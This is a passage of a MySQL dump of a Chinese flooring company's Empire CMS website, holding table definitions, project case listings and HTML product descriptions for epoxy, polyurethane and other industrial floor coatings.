6,1,0,0,'','/cpzx/jtanss/2020-04-24/140.html',1,1,1,'','交通安全设施9',1587695909,'/d/file/6cc80fc56fd5aba701e2bb85fd4c956d.jpg',0,'','',0),(141,23,0,0,0,0,'2020-04-24','141',1,'admin',0,0,1,0,0,0,0,1587695942,1587695942,1,0,0,'','/cpzx/jtanss/2020-04-24/141.html',1,1,1,'','交通安全设施10',1587695928,'/d/file/b35bf9682561c218487cf2c9cda0ea79.jpg',0,'','',0),(142,23,0,0,0,0,'2020-04-24','142',1,'admin',0,0,1,0,0,0,0,1587695956,1587695956,1,0,0,'','/cpzx/jtanss/2020-04-24/142.html',1,1,1,'','交通安全设施11',1587695944,'/d/file/c8bdec85849584c48f55ccde35633c6c.jpg',0,'','',0),(143,23,0,0,0,0,'2020-04-24','143',1,'admin',0,0,1,0,0,0,0,1587695971,1587695971,1,0,0,'','/cpzx/jtanss/2020-04-24/143.html',1,1,1,'','交通安全设施12',1587695959,'/d/file/85b5a1a99e58a6f2b5b3c6b8b8074582.jpg',0,'','',0),(144,23,0,0,0,0,'2020-04-24','144',1,'admin',0,0,1,0,0,0,0,1587695989,1587695989,1,0,0,'','/cpzx/jtanss/2020-04-24/144.html',1,1,1,'','交通安全设施13',1587695974,'/d/file/5cba3d4bc81967e7707b70a3f5f4f5f9.jpg',0,'','',0),(145,23,0,0,0,0,'2020-04-24','145',1,'admin',0,0,1,0,0,0,0,1587696040,1587696040,1,0,0,'','/cpzx/jtanss/2020-04-24/145.html',1,1,1,'','交通安全设施14',1587695991,'/d/file/5367955b69eb105a7fd7f361c8299d75.jpg',0,'','',0),(146,23,0,0,0,0,'2020-04-24','146',1,'admin',0,0,1,0,0,0,0,1587696059,1587696059,1,0,0,'','/cpzx/jtanss/2020-04-24/146.html',1,1,1,'','交通安全设施15',1587696043,'/d/file/d9468edc772afa48a955aff5be205859.jpg',0,'','',0),(148,18,0,0,0,0,'','148',1,'admin',0,0,1,0,0,0,0,1587698378,1587698881,1,0,0,'','/gcal/zxal/148.html',1,1,1,'','车库地坪图',1587698307,'/d/file/ec05d4f51ebe138b354fdce2d9699875.jpg',0,'','',0),(149,18,0,0,0,0,'','149',1,'admin',0,0,1,0,0,0,0,1587698533,1587698894,1,0,0,'','/gcal/zxal/149.html',1,1,1,'','成都工投国宾总部基地停车场施工案例',1587698425,'/d/file/5de1daf91446998bf2ee875ec4aec671.jpg',0,'','',0),(150,18,0,0,0,0,'','150',1,'admin',0,0,1,0,0,0,0,1587698665,1587698927,1,0,0,'','/gcal/zxal/150.html',1,1,1,'','成都康师傅方便面厂区环氧自流平施工案例',1587698535,'/d/file/7a34fbf4eb012d7c3dc0b165413d98bb.jpg',0,'','',0),(151,18,0,0,0,0,'','151',1,'admin',0,0,1,0,0,0,0,1587698721,1587698956,1,0,0,'','/gcal/zxal/151.html',1,1,1,'','成都易上OCG施工案例',1587698668,'/d/file/2b4bc1d60f2226acf9a0b69955ad8ef2.jpg',0,'','',0),(152,18,0,0,0,0,'','152',1,'admin',0,0,1,0,0,0,0,1587698827,1587698979,1,0,0,'','/gcal/zxal/152.html',1,1,1,'','地材科技馆',1587698723,'/d/file/b52dfdb1a39ee9b51aeff2f0a5a1d3c8.jpg',0,'','',0),(153,18,0,0,0,0,'','153',1,'admin',0,0,1,0,0,0,0,1587699082,1587699082,1,0,0,'','/gcal/zxal/153.html',1,1,1,'','金科地产集团整装车库案例',1587698983,'/d/file/8c6c3e1fd92ffaa740067c35df7dd92a.jpg',0,'','',0),(154,18,0,0,0,0,'','154',1,'admin',0,0,1,0,0,0,0,1587699134,1587699134,1,0,0,'','/gcal/zxal/154.html',1,1,1,'','丽邦川东北金融中心接待区环氧彩砂地坪案例',1587699084,'/d/file/448b84206165414fe62774df2c7841ee.jpg',0,'','',0),(155,18,0,0,0,0,'','155',1,'admin',0,0,1,0,0,0,0,1587699180,1587699180,1,0,0,'','/gcal/zxal/155.html',1,1,1,'','南充市第十中学硅PU球场施工案例',1587699137,'/d/file/ffa84fa477f180d1cea3cd76e355d83f.jpg',0,'','',0),(156,18,0,0,0,0,'','156',1,'admin',0,0,1,0,0,0,0,1587699323,1587699323,1,0,0,'','/gcal/zxal/156.html',1,1,1,'','南充市黄金江岸绿道透水路面工程',1587699182,'/d/file/51906543eced3a38978d35a95841e02a.jpg',0,'','',0),(157,18,0,0,0,0,'','157',1,'admin',0,0,1,0,0,0,0,1587699404,1587699404,1,0,0,'','/gcal/zxal/157.html',1,1,1,'','南充市物流园混泥土激光超平系统案例',1587699326,'/d/file/b8a8d4b36d01b86af5ac12326451f5c5.jpg',0,'','',0),(158,18,0,0,0,0,'','158',1,'admin',0,0,1,0,0,0,0,1587699510,1587699510,1,0,0,'','/gcal/zxal/158.html',1,1,1,'','山语城EPDM塑胶运动场施工案例',1587699406,'/d/file/300f7da86148fb9153868ccb1128d53c.jpg',0,'','',0),(159,18,0,0,0,0,'','159',1,'admin',0,0,1,0,0,0,0,1587699617,1587699617,1,0,0,'','/gcal/zxal/159.html',1,1,1,'','四川外国语学校炳稀酸篮球场地坪施工案例',1587699512,'/d/file/e4a4edaf4734d1f8a605025d2dac9efe.jpg',0,'','',0),(160,18,0,0,0,0,'','160',1,'admin',0,0,1,0,0,0,0,1587699717,1587699717,1,0,0,'','/gcal/zxal/160.html',1,1,1,'','四川外国语学校悬浮地板篮球球场工程案例',1587699619,'/d/file/a3a950668fdfc7868ae6ac613d02ae58.jpg',0,'','',0),(161,18,0,0,0,0,'','161',1,'admin',0,0,1,0,0,0,0,1587699938,1587699938,1,0,0,'','/gcal/zxal/161.html',1,1,1,'','遂宁电影院城市广场陶瓷防滑地坪',1587699720,'/d/file/99d35ec9a7d9a7b91ed29266a5c37536.jpg',0,'','',0),(162,18,0,0,0,0,'','162',1,'admin',0,0,1,0,0,0,0,1587699982,1587699982,1,0,0,'','/gcal/zxal/162.html',1,1,1,'','遂宁东湖丽景耐磨地坪工程案例',1587699940,'/d/file/b87b8d2b07c90db5a239b4cbd87f6b61.jpg',0,'','',0),(163,18,0,0,0,0,'','163',1,'admin',0,0,1,0,0,0,0,1587700106,1587700106,1,0,0,'','/gcal/zxal/163.html',1,1,1,'','五星小学防刻划环氧自流平案例',1587699984,'/d/file/df12376b218f63981ccc71e4381e1ccd.jpg',0,'','',0),(164,18,0,0,0,0,'','164',1,'admin',0,0,1,0,0,0,0,1587700285,1587700285,1,0,0,'','/gcal/zxal/164.html',1,1,1,'','重庆巫山神女药业厂区环氧自流平施工案例',1587700108,'/d/file/c2b0b4924fe40c44886f05cb02c74b5d.jpg',0,'','',0),(165,18,0,0,0,0,'','165',1,'admin',0,0,1,0,0,0,0,1588152755,1589427209,1,0,0,'','/gcal/zxal/165.html',1,1,1,'','遂宁金海国际车库案例',1588152158,'/d/file/95cea93d80ae36286bb114dc4b2614a7.jpg',0,'','​',0),(166,18,0,0,0,0,'','166',1,'admin',0,0,1,0,0,0,0,1588152945,1589427191,1,0,0,'','/gcal/zxal/166.html',1,1,1,'','四川兴德红油厂区环氧自流平案例',1588152758,'/d/file/e25d0ed1e8f9da9bfd440321a57930b4.jpg',0,'','',0),(181,20,0,0,0,0,'','181',1,'admin',0,0,1,0,0,0,0,1646374883,1646375061,1,0,0,'','/gssl/ryzz/181.html',1,1,1,'','资质4',1646374868,'/d/file/b4600ddca80b10241f95055167d294b5.jpg',0,'','',0),(182,20,0,0,0,0,'','182',1,'admin',0,0,1,0,0,0,0,1646374900,1646375067,1,0,0,'','/gssl/ryzz/182.html',1,1,1,'','资质5',1646374884,'/d/file/5cffd9adbbd3aa6a9f25e1a84504d692.jpg',0,'','',0),(183,20,0,0,0,0,'','183',1,'admin',0,0,1,0,0,0,0,1646374916,1646375072,1,0,0,'','/gssl/ryzz/183.html',1,1,1,'','资质6',1646374901,'/d/file/c249a68274d9a93a2b249ef79829daa2.jpg',0,'','',0);
/*!40000 ALTER TABLE `libang_ecms_news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_check`
--

DROP TABLE IF EXISTS `libang_ecms_news_check`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_check` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_check`
--

LOCK TABLES `libang_ecms_news_check` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_check` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_news_check` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_check_data`
--

DROP TABLE IF EXISTS `libang_ecms_news_check_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_check_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `befrom` varchar(60) NOT NULL DEFAULT '',
  `newstext` mediumtext NOT NULL,
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_check_data`
--

LOCK TABLES `libang_ecms_news_check_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_check_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_news_check_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news_data_1`
--

DROP TABLE IF EXISTS `libang_ecms_news_data_1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news_data_1` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `befrom` varchar(60) NOT NULL DEFAULT '',
  `newstext` mediumtext NOT NULL,
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news_data_1`
--

LOCK TABLES `libang_ecms_news_data_1` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news_data_1` DISABLE KEYS */;
INSERT INTO `libang_ecms_news_data_1` VALUES (1,12,'',1,0,0,0,'','','','企业简介：<br />南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造&ldquo;你的满意我们的无限动力&rdquo;的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。<br />我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。<br />公司拥有先进的生产基地和设施完备的实验中心。主要产品有：环氧自流坪，环氧砂浆地坪，环氧薄涂地坪，车库交通设施，塑胶跑道，硅PU球场，丙烯酸球场，以及环氧树脂玻纤地板、环氧树脂防静电地板、环氧防腐地板、水性环氧地板、 PVC塑胶地板,全钢防静电地板、透水地板、艺术地板、金刚砂耐磨地板及化学腐蚀的防腐处理等。产品主要应用于：精密仪器、食品工间、烟草、光学生物制品、学校、商场、车场等领域。<br />公司努力传播先进涂装理念，积极参与行业标准的制定，始终以材料技术、涂装工艺创新作为企业生存与发展的动力，在产品研发，施工工艺上孜孜以求，不断推出具有自主知识产权的核心技术。<br />丽邦用心为顾客提供优质产品和专业化的技术服务，积极推崇绿色环保产品，树立企业的社会责任形象，是工业地坪系统方案的解决专家，领先的产品品质及优质的服务使丽邦在行业内有着卓著的口碑和业绩。<br />&nbsp;'),(167,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/be9769bf638fa200e948894827d4ed70.jpg\\\" />'),(168,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/3c65b6c70740b23c3c14213424942d13.jpg\\\" />'),(169,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/9b99693d85f3f0d709e6a272c2850b04.jpg\\\" />'),(73,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/a08f21813a437c6b14ed399874a3bb1a.jpg\\\" />'),(74,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/c6209928fc7aa5ea6304aac0472d5b2a.jpg\\\" />'),(75,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/8f91e93abf1a60248efa99d4b36ca547.jpg\\\" />'),(4,6,'',1,0,0,0,'','','','<strong>南充市丽邦装饰工程有限公司</strong><br /><font face=\\\"Verdana\\\">电话：0817-3618388<br />热线：15196780978（王总）<br />售后服务：0817-3618388<br />邮编：637000<br /><font face=\\\"Verdana\\\">邮箱：1024957682@qq.com<br />网址：http://www.sclbdp.com<br />地址：四川省南充市川东北金融广场五栋18-22号</font></font>'),(5,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>1、各类厂房、机械厂、化工厂、食品饮料厂、电子制品厂、污水处理厂、制药厂、冷库、棉纺厂等；</p>\r\n<p>2、各类库房、地下停车场、飞机库、汽车4S店、物流中心、大型卖场等。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、性价比高的地坪保护方法；</p>\r\n<p>2、色彩多样，提高地坪美观度；</p>\r\n<p>3、易施工，不需要特别的施工设备或技术；</p>\r\n<p>4、防止处理后的地面起尘；</p>\r\n<p>5、高耐久性，提高地坪的耐磨性和抗油脂污染性能。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、粗磨，将地面清洗干净，吸尘机吸干，地面完全干燥；</p>\r\n<p>2、干磨，让地面达到哑光效果且平整干滑，清洗地面；</p>\r\n<p>3、施工彩色固化剂A组份，完全干燥，重复第二次施工；</p>\r\n<p>4、施工完A组份至少24小时后施工B组份；</p>\r\n<p>5、用喷雾器均匀喷洒B组份，B组份施工完毕已干透后，用高速抛光机抛光。</p>'),(7,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>大型仓储中心、物流中心、零售业的综合配送中心、超窄巷道仓库、铁道运输储备中心、货运码头、电视节目演播室、溜冰场、使用精密仪器、设备的生产车间等对地面要求特别平整度的工业厂房车间、航空航天制造中心等等。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、施工时节省人工、降低劳动强度，成品后减小地面开裂几率；</p>\r\n<p>2、地坪表面更密实、平整亮洁、摩擦受力均匀；</p>\r\n<p>3、耐磨耐压性高，易保养、清洁；</p>\r\n<p>4、叉车等运行平稳、速度快、效率高且不会碰撞货架及倾倒，使用寿命长。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、设定铺注区域；</p>\r\n<p>2、测试地坪水平；</p>\r\n<p>3、完成浇筑工作；</p>\r\n<p>4、保养及养护作业；</p>\r\n<p>5、打磨及抛光作业；</p>\r\n<p>6、自动测试仪测地坪。</p>'),(6,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于广场、机场、仓库、停车场、商场、超市、重载机械厂、汽车维修厂等各类厂房。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、硬度高、耐磨性好；</p>\r\n<p>2、可长期承受重载；</p>\r\n<p>3、不易起尘，造价低廉。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、新浇筑混凝土在其初凝时，将金刚砂骨料均匀撒布在其表面，并用抹光机抹平地面；</p>\r\n<p>2、再次撒布金刚砂骨料，并抹平和抛光；</p>\r\n<p>3、涂刷养护剂；</p>\r\n<p>4、按要求做伸缩缝。</p>'),(8,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>学校、医院、办公、工厂、商场、汽车、船舶、地铁、火车、家居、实验室、试验室、科研、楼梯、养老院、图书馆、影剧院等各种场所。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>适用范围广；耐污、抗酸碱性好，免维护；富有弹性、防滑性能好；耐磨、抗菌，不会虫蛀、霉变；尺寸稳定性好、不会受温度、潮湿影响变形；安全、环保不含甲醛；隔音降噪，脚感舒适；色彩、花样丰富，完全满足个性设计需要。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基层找平清理；</p>\r\n<p>2、弹线；</p>\r\n<p>3、卷材预铺设；</p>\r\n<p>4、卷材接缝处理；</p>\r\n<p>5、特殊部位处理；</p>\r\n<p>6、固定、压边；</p>\r\n<p>7、密封材料封边。</p>'),(9,7,'',1,0,0,0,'','','','<p><strong>产品介绍：</strong></p>\r\n<p>水性纳米硅颜色面料乳液(双组份)，是采用百分之七十八的水性聚氨酯和纳米级的无机硅类矿物材料精制而成，纳米硅粉具有纯度高，粒径小、分布均匀、无毒无味、防火、活性好等特点，是一种环保、清洁、耐水、耐磨性能优异的地坪材料。</p>\r\n<p><strong>适用范围：</strong></p>\r\n<p>用于所有基础良好的成型材质:室内车库、商场、厂房、仓库、地下停车场、写字楼、办公室、娱乐场所、家庭室内外、水泥、瓷砖木地板、PVC等成型材质面涂装。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、水性产品，无毒无味、无污染、不燃不爆，安全环保;</p>\r\n<p>2、优异的防霉,耐碱，抗水性能;</p>\r\n<p>3、施工简便,快干保养时间短;</p>\r\n<p>4、优异的耐化学介质性能，如酸，碱，盐等;</p>\r\n<p>5、水性涂料，对环境无污染，确保了施工人员的身体健康。</p>'),(10,7,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>不发火防静电耐磨地坪主要用于电子、航天、通讯、计算机、精密仪器等一切要求洁净、不发火且防静电的厂房车间地面。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>1、具有卓越耐磨性、抗冲击性、高抗压、高抗折强度;</p>\r\n<p>2、易维护易清洁;</p>\r\n<p>3、具有优异的不发火防爆性能;</p>\r\n<p>4、快速泄露电荷，持久性导电，具有优异的导电性能。</p>\r\n<p><strong>施工工艺</strong></p>\r\n<p>1、基础压实或浇筑完混凝土垫层后，在完成的垫层上铺设导电钢筋网，并接地或接离子端;</p>\r\n<p>2、按设定间距固定导电螺栓,同时将导电钢筋网固定在导电螺栓.上;</p>\r\n<p>3、基层混凝士摊铺。基层砼配比时，水泥含量应&ge;300Kg/m,水灰比&le;0.55,搅拌摊铺后应将离析及泌水减至最低，塌落度应在75-100mm,浇筑捣实过程中保持表面平整度，减少浮浆出现;确保最终饰面的不发火防静电性能;</p>\r\n<p>4、施工工艺基本同于金属或非金属耐磨地坪。</p>'),(11,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>超高压电气、制药、化学品、低温冷库、食品加工厂、奶制品厂、酿酒厂和重载荷强冲击的极端工业环境下使用。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、抗压强度、抗折强度尤其是抗冲击性能突出；坚韧且粘接强度好，因此具有很好的防止脱层和抗开裂性能；</p>\r\n<p>2、化学性能：抗大多数无机有机溶液的侵蚀；对无机酸、有机酸、乳酸、</p>\r\n<p>油酸、果酸有较好的抗腐蚀性；</p>\r\n<p>3、高低温性能：可在-40℃～+120℃下长期使用，12mm厚的地坪可耐150℃短时热冲击。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理：打磨基面、清洁干燥；</p>\r\n<p>2、底涂层：用聚氨酯底涂滚刷；</p>\r\n<p>3、砂浆中涂层：用聚氨酯中涂料，刮涂至所需的厚度；</p>\r\n<p>4、面涂层：用聚氨酯封闭剂，滚涂。</p>\r\n<p>&nbsp;</p>'),(12,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于对地面的美观、舒适有较高要求的场合，适应于对地坪的弹性、耐磨性、耐冲击性有较高要求的场合，适合于对地坪的耐化学品性能有较高要求的场合。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、耐强力冲击、耐磨损；</p>\r\n<p>2、可耐大部分酸、碱、盐、汽油、机油等化学品的腐蚀；</p>\r\n<p>3、表面平整，光亮，美观；</p>\r\n<p>4、无接缝，易清洁，微生物不易生存；</p>\r\n<p>5、无溶剂，无有毒有害重金属，符合环保要求。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理；</p>\r\n<p>2、涂刷聚氨酯封闭底漆；</p>\r\n<p>3、刮涂中层漆；</p>\r\n<p>4、打磨、吸尘；</p>\r\n<p>5、刮涂聚氨酯腻子；</p>\r\n<p>6、镘涂聚氨酯自流平（亮光、哑光）。</p>'),(13,7,'',1,0,0,0,'','','','<p><strong>使用范围：</strong></p>\r\n<p>环氧树脂地坪密封层和需要高耐磨地面的重交通区。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、高固含量；</p>\r\n<p>2、优异的耐磨损，抗冲击性能；</p>\r\n<p>3、很好的耐UV性能，无黄变；</p>\r\n<p>4、纹理表面；</p>\r\n<p>5、很好的抗化学性能；</p>\r\n<p>6、透明色（3组份）和彩色（4组份）。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理；</p>\r\n<p>2、聚氨酯底涂；</p>\r\n<p>3、聚氨酯批涂；</p>\r\n<p>4、聚氨酯面涂。</p>'),(14,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>特别适用于重防腐要求的作业面和工作场所，如强酸、碱池排污沟槽等作业环境。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、耐高温，抗疲劳，优异的机械性能和韧性；</p>\r\n<p>2、自由调配固化时间，粘度低，易施工；</p>\r\n<p>3、低温固化；</p>\r\n<p>4、在100℃以下，能抵抗大部分的酸、碱、盐等化学试剂的侵蚀。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理：打磨清洁，要求基面干燥、平整、无空鼓；</p>\r\n<p>2、涂刷乙烯基酯防腐底漆；</p>\r\n<p>3、中涂打磨、清洁；</p>\r\n<p>4、涂刷乙烯基酯防腐中层漆加玻纤布的铺设，批刮腻子；</p>\r\n<p>5、涂装乙烯基酯防腐清漆。</p>'),(15,7,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>聚脲耐磨地坪是一种专门针对混凝土地面设计的新型的具有一定弹性的双组份防腐耐磨地坪。用于混凝土的防护，特别适用于工期紧、防护强度要求高的地坪涂装工程，广泛用于工厂、市政、商业等方面的地坪涂装。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、反应活性高、固化速度快、垂直面、顶面及任意曲面均可连续施工；</p>\r\n<p>2、弹性体和刚性体涂层的优异结合；</p>\r\n<p>3、100%固含、无有机物挥发、无毒、系无污染的绿色喷涂技术；</p>\r\n<p>4、抗冲击、耐磨的优异物理性能。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理；</p>\r\n<p>2、涂刷封闭聚脲底漆；</p>\r\n<p>3、刮涂找平中涂层；</p>\r\n<p>4、刷涂聚脲界面剂；</p>\r\n<p>5、喷涂聚脲面漆。</p>\r\n<p>6、涂刷脂肪族耐候漆。</p>'),(16,8,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>室内外车库、工业厂房、食品厂等要求 防水、耐候性好的区域以及坏旧环氧地坪修补。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>1、优良的耐候性和耐水性,尤其适合用于户外使用;</p>\r\n<p>2、涂层具有良好的耐磨防滑性能;</p>\r\n<p>3、施工快速、成本经济。</p>\r\n<p><strong>施工工艺</strong></p>\r\n<p>1、基面处理:打磨基面、清洁干燥;</p>\r\n<p>2、底涂层:用京珀Jingbo-101环氧底油辊刷1遍，参考用量: 0.2kg/m2 左右;</p>\r\n<p>3、砂浆中涂层:用京珀Jingbo- 201环氧砂浆中涂，调配约1倍石英砂刮涂至所需的厚度;</p>\r\n<p>4、腻子层:用京珀Jingbo-202无溶剂环氧中涂，分批次刮涂，封闭密实、平整;</p>\r\n<p>5、面涂层:镘涂京珀Jingbo-501无溶剂环氧自流平面漆- -遍;</p>\r\n<p>6、罩面层:用京珀Jingbo-306耐候防滑纹理面清漆滚涂一遍;</p>\r\n<p>7、涂层厚度:一般为1mm~3mm</p>'),(17,8,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>电子、电器、食品、制药厂等无尘洁净车间。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、环保无毒、流平性好、表面平滑美观；</p>\r\n<p>2、透湿气性好，可在潮湿环境中施工，不起泡；</p>\r\n<p>3、耐弱酸、弱碱、盐类等化学品腐蚀；</p>\r\n<p>4、耐磨、耐冲击，承载性好，寿命持久。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面打磨处理、清理干净</p>\r\n<p>2、涂刷水性环氧树脂底漆；</p>\r\n<p>3、刮涂水性环氧树脂砂浆；</p>\r\n<p>4、批刮水性环氧树脂腻子；</p>\r\n<p>5、涂刷水性环氧树脂面漆。</p>'),(18,8,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>特别适用于航空航天、计算机房、电子企业、军工企业、水坝控制中心以及各种易燃易爆厂房地面。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、抗压抗冲击、强度高、韧性好；</p>\r\n<p>2、电阻值105-109&Omega;，防静电性能持久；</p>\r\n<p>3、漆膜平整、有质感；</p>\r\n<p>4、易清洁、耐污染。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、素地处理：打磨清洁，基面要求干燥、平整、无空鼓；</p>\r\n<p>2、底涂涂装：防静电底涂封闭涂装；</p>\r\n<p>3、铺设导电铜箔；</p>\r\n<p>4、刮涂中层漆；</p>\r\n<p>5、批刮导电腻子；</p>\r\n<p>6、环氧防静电面涂涂装。</p>'),(19,8,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于实行GMP标准的制药行业、血液制品行业、医疗行业、生物研究、电子及微电子行业的无尘室或者无菌室。同样也可用于要求美观、耐磨、抗冲击、防化学品的其它行业，如学校、办公室、化工厂、食品厂等。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、表面平整光亮达镜面效果；</p>\r\n<p>2、颜色多样，无毒无味无接缝，美观舒适；</p>\r\n<p>3、光洁无缝，防尘，易清洗；</p>\r\n<p>4、坚韧、耐磨、耐药性好